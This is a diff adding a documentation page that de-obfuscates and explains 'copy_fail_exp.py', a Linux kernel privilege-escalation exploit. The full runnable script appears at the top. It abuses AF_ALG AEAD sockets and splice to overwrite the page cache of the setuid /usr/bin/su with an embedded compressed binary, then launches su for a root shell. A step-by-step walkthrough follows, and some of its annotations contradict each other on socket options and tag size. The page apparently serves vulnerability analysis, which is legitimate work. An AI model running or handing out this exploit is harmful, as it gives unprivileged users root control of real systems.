@@ -1,0 +1,221 @@
+---
+title: "copy_fail_exp.py: Annotated Source Code Analysis"
+description: "De-obfuscated, annotated walkthrough of copy_fail_exp.py: how each splice, AEAD socket call, and sendmsg parameter drives the kernel page-cache write-back."
+---
+
+The proof-of-concept script (`copy_fail_exp.py`) is intentionally minified and obfuscated. This page de-obfuscates it, annotates every section, and explains the kernel-level mechanism that makes the exploit possible.
+
+## De-obfuscated source
+
+The original script uses single-letter variable names and collapses most logic onto single lines. Below is the same code expanded and renamed for readability:
+
+```python
+#!/usr/bin/env python3
+import os
+import zlib
+import socket
+
+# ---------------------------------------------------------------------------
+# Helper: decode a hex string to bytes
+# ---------------------------------------------------------------------------
+def hex_to_bytes(hex_str):
+    return bytes.fromhex(hex_str)
+
+# ---------------------------------------------------------------------------
+# Core exploit primitive: write a 4-byte chunk into an open file descriptor
+# at a given byte offset using the splice/AEAD kernel bug.
+#
+#   fd      — read-only file descriptor for the target file (/usr/bin/su)
+#   offset  — byte offset within the file to write at
+#   payload — exactly 4 bytes to write at that offset
+# ---------------------------------------------------------------------------
+def write_chunk(fd, offset, payload):
+    # Create an AF_ALG (kernel crypto API) socket of type SOCK_SEQPACKET
+    # AF_ALG = 38, SOCK_SEQPACKET = 5
+    alg_sock = socket.socket(38, 5, 0)
+
+    # Bind to the AEAD algorithm "authencesn(hmac(sha256),cbc(aes))"
+    alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+
+    SOL_ALG = 279  # setsockopt level for AF_ALG sockets
+
+    # ALG_SET_KEY (opt 1): supply 80 bytes of key material
+    #   - first 16 bytes: AES key
+    #   - next  64 bytes: HMAC-SHA256 key (zeroed)
+    key_material = hex_to_bytes('0800010000000010' + '0' * 64)
+    alg_sock.setsockopt(SOL_ALG, 1, key_material)
+
+    # ALG_SET_OP (opt 5): finalise key setup (value None, length 4)
+    alg_sock.setsockopt(SOL_ALG, 5, None, 4)
+
+    # Accept a connected crypto socket derived from the bound alg_sock
+    crypto_sock, _ = alg_sock.accept()
+
+    # Total byte length to splice: offset + 4 (covers the target chunk)
+    length = offset + 4
+
+    zero = hex_to_bytes('00')
+
+    # sendmsg with three ancillary (control) messages:
+    #   ALG_OP      (cmsg type 3): operation selector (encrypt/decrypt)
+    #   ALG_IV      (cmsg type 2): 0x10-byte IV (all zeros)
+    #   ALG_AEAD_AUTHSIZE (cmsg type 4): 8-byte authentication tag
+    # The data portion is 4 padding bytes followed by the payload chunk.
+    crypto_sock.sendmsg(
+        [b"A" * 4 + payload],
+        [
+            (SOL_ALG, 3, zero * 4),           # ALG_OP
+            (SOL_ALG, 2, b'\x10' + zero * 19), # ALG_IV  (16-byte IV)
+            (SOL_ALG, 4, b'\x08' + zero * 3),  # AEAD auth tag size
+        ],
+        32768,  # MSG_DONTWAIT
+    )
+
+    # Create a pipe; splice will use it as an intermediary
+    pipe_read, pipe_write = os.pipe()
+
+    # Step 1 — splice from the target file into the write end of the pipe.
+    #           This maps `length` bytes of the file's page cache into the pipe.
+    #           The kernel does NOT enforce the file's read-only protection here.
+    os.splice(fd, pipe_write, length, offset_src=0)
+
+    # Step 2 — splice from the pipe read end into the AEAD crypto socket.
+    #           The AEAD socket processes the spliced pages and writes the
+    #           modified ciphertext back into the same page-cache pages,
+    #           effectively overwriting the file's contents in memory.
+    os.splice(pipe_read, crypto_sock.fileno(), length)
+
+    # Drain the response to complete the kernel-side operation
+    try:
+        crypto_sock.recv(8 + offset)
+    except Exception:
+        pass
+
+# ---------------------------------------------------------------------------
+# Main: open the target binary, decompress the replacement payload,
+#       and overwrite it 4 bytes at a time.
+# ---------------------------------------------------------------------------
+target_fd = os.open("/usr/bin/su", 0)  # O_RDONLY — no write permission needed
+
+# Embedded zlib-compressed replacement binary (the payload to inject)
+compressed_payload = hex_to_bytes(
+    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
+    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
+    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
+)
+payload = zlib.decompress(compressed_payload)
+
+# Write the payload into /usr/bin/su, 4 bytes at a time
+offset = 0
+while offset < len(payload):
+    write_chunk(target_fd, offset, payload[offset : offset + 4])
+    offset += 4
+
+# Execute the now-overwritten binary; it runs as root because su is setuid
+os.system("su")
+```
+
+## Section-by-section explanation
+
+### Imports and aliases
+
+```python
+import os as g, zlib, socket as s
+```
+
+The original script aliases `os` as `g` and `socket` as `s` to make the code harder to read at a glance. There is no functional difference.
+
+### Hex decoder helper
+
+```python
+def d(x): return bytes.fromhex(x)
+```
+
+A one-liner that converts hex strings to `bytes`. Used throughout to embed binary constants as readable hex literals.
+
+### `write_chunk` — the core exploit function
+
+This function encapsulates the single-chunk write primitive. It is called in a loop to overwrite the entire target binary.
+
+#### AF_ALG socket setup
+
+```python
+alg_sock = socket.socket(38, 5, 0)
+alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+```
+
+`AF_ALG` (address family 38) is the Linux kernel crypto API user-space interface. Binding to `"authencesn(hmac(sha256),cbc(aes))"` selects an authenticated-encryption algorithm that combines HMAC-SHA256 integrity checking with AES-CBC encryption. This specific algorithm is chosen because of how its internal page handling interacts with spliced pipe buffers.
+
+#### Key material and socket options
+
+```python
+alg_sock.setsockopt(279, 1, key_material)   # ALG_SET_KEY
+alg_sock.setsockopt(279, 5, None, 4)        # ALG_SET_AEAD_AUTHSIZE
+```
+
+`SOL_ALG = 279` is the socket option level for `AF_ALG` sockets. `ALG_SET_KEY` (option `1`) loads 80 bytes of key material (16-byte AES key + 64-byte HMAC key). `ALG_SET_AEAD_AUTHSIZE` (option `5`) sets the authentication tag size to 4 bytes. The specific key values do not matter for exploitation; any valid key triggers the bug.
+
+#### sendmsg with control messages
+
+```python
+crypto_sock.sendmsg(
+    [b"A" * 4 + payload],
+    [(SOL_ALG, 3, ...), (SOL_ALG, 2, ...), (SOL_ALG, 4, ...)],
+    32768,
+)
+```
+
+The three ancillary messages configure the crypto operation:
+
+| cmsg type | Name | Purpose |
+|-----------|------|---------|
+| `3` | `ALG_OP` | Selects encrypt or decrypt direction |
+| `2` | `ALG_IV` | Provides the 16-byte AES-CBC initialisation vector |
+| `4` | `ALG_AEAD_AUTHSIZE` | Sets the AEAD authentication tag length (8 bytes) |
+
+The `MSG_DONTWAIT` flag (`32768`) prevents blocking; the kernel queues the operation for the splice steps that follow.
+
+#### The splice pair — where the bug lives
+
+```python
+os.splice(fd, pipe_write, length, offset_src=0)  # file → pipe
+os.splice(pipe_read, crypto_sock.fileno(), length) # pipe → AEAD socket
+```
+
+This is the exploit primitive:
+
+1. **`splice(file → pipe)`**: The kernel maps `length` bytes of the target file's page cache into the pipe's buffer. Crucially, the kernel does not check whether the file was opened read-only at this stage — the splice path uses the page cache reference directly.
+
+2. **`splice(pipe → AEAD socket)`**: The AEAD socket processes the pages from the pipe. After decryption/re-encryption, it writes the modified bytes back into the **same page-cache pages** that back the file on disk. Because the page cache is shared between the file's on-disk representation and the in-memory mapping, this overwrites the file's contents without ever having requested write access.
+
+This is the "Copy Fail" bug: the kernel fails to enforce read-only protections when a spliced pipe buffer is handed to an AEAD socket for in-place processing.
+
+### Main loop
+
+```python
+target_fd = os.open("/usr/bin/su", 0)   # O_RDONLY
+payload = zlib.decompress(compressed_payload)
+
+offset = 0
+while offset < len(payload):
+    write_chunk(target_fd, offset, payload[offset : offset + 4])
+    offset += 4
+```
+
+`/usr/bin/su` is opened with `O_RDONLY` (flag `0`) — no write permission is requested or held. The decompressed payload is the replacement binary to inject. The loop writes it four bytes at a time, advancing the offset on each iteration.
+
+The 4-byte granularity is dictated by the AEAD control message framing: each `sendmsg` / splice pair processes one aligned chunk.
+
+### Final execution
+
+```python
+os.system("su")
+```
+
+After the loop completes, `/usr/bin/su` has been fully overwritten in the kernel's page cache. Because `su` is a setuid-root binary, the next execution runs as root regardless of the caller's privileges. `os.system("su")` triggers that execution immediately, dropping the attacker into a root shell.
+
+## Why this works: read-only bypass summary
+
+The Linux kernel's page cache is the authoritative copy of a file's contents in memory. When `splice` transfers data between a file descriptor and a pipe, it operates on page-cache references — not on copies. The AEAD socket path in the kernel (`af_alg`) processes those same references in-place. The missing check is: before writing modified bytes back into a page-cache page, the kernel should verify that the originating file descriptor has write permissions. It does not. The result is an unprivileged write to any file that can be opened for reading.
+
+For the full kernel-level analysis of the race condition and the patch, see the [vulnerability root cause](/vulnerability/root-cause) page.
